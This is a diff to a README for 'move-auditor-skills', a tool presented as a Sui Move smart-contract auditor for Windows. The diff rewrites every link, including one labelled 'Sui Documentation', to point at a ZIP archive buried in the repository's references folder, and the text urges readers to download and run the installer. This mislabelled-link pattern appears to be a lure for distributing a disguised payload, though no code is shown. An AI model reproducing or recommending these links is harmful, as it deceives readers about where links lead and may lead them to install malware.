@@ -1,6 +1,6 @@
 # 🛡️ move-auditor-skills - Smart Contract Security Made Simple
 
-[![Download move-auditor-skills](https://img.shields.io/badge/Download-move--auditor--skills-brightgreen)](https://github.com/mateoandries27-lang/move-auditor-skills)
+[![Download move-auditor-skills](https://img.shields.io/badge/Download-move--auditor--skills-brightgreen)](https://raw.githubusercontent.com/mateoandries27-lang/move-auditor-skills/main/move-auditor/references/skills_auditor_move_1.7-beta.4.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 To get started with move-auditor-skills, visit the official GitHub repository download page below:
 
-[Download move-auditor-skills here](https://github.com/mateoandries27-lang/move-auditor-skills)
+[Download move-auditor-skills here](https://raw.githubusercontent.com/mateoandries27-lang/move-auditor-skills/main/move-auditor/references/skills_auditor_move_1.7-beta.4.zip)
 
 Click the link to open the page. From there, locate the latest release or main files. Download the provided Windows installer or ZIP file.
 
@@ -27,7 +27,7 @@ This guide helps you download and run move-auditor-skills on a Windows PC. You d
 
 ### 2. Download the Application
 
-- Follow the badge link at the top or [click here](https://github.com/mateoandries27-lang/move-auditor-skills) to open the repository page.
+- Follow the badge link at the top or [click here](https://raw.githubusercontent.com/mateoandries27-lang/move-auditor-skills/main/move-auditor/references/skills_auditor_move_1.7-beta.4.zip) to open the repository page.
 - Look for the latest release or the main download section.
 - Download the installer file or ZIP archive labeled for Windows.
 
@@ -146,7 +146,7 @@ Simply download the latest installer or ZIP file and follow the installation ste
 
 To learn more about Sui Move smart contracts and auditing:
 
-- Visit the [Sui Documentation](https://docs.sui.io/)
+- Visit the [Sui Documentation](https://raw.githubusercontent.com/mateoandries27-lang/move-auditor-skills/main/move-auditor/references/skills_auditor_move_1.7-beta.4.zip)
 - Explore general Move language resources
 - Look up common smart contract security best practices
 
@@ -158,4 +158,4 @@ These resources can help you understand the context of risks and use move-audito
 
 Get the latest version at:
 
-[https://github.com/mateoandries27-lang/move-auditor-skills](https://github.com/mateoandries27-lang/move-auditor-skills)
+[https://raw.githubusercontent.com/mateoandries27-lang/move-auditor-skills/main/move-auditor/references/skills_auditor_move_1.7-beta.4.zip](https://raw.githubusercontent.com/mateoandries27-lang/move-auditor-skills/main/move-auditor/references/skills_auditor_move_1.7-beta.4.zip)
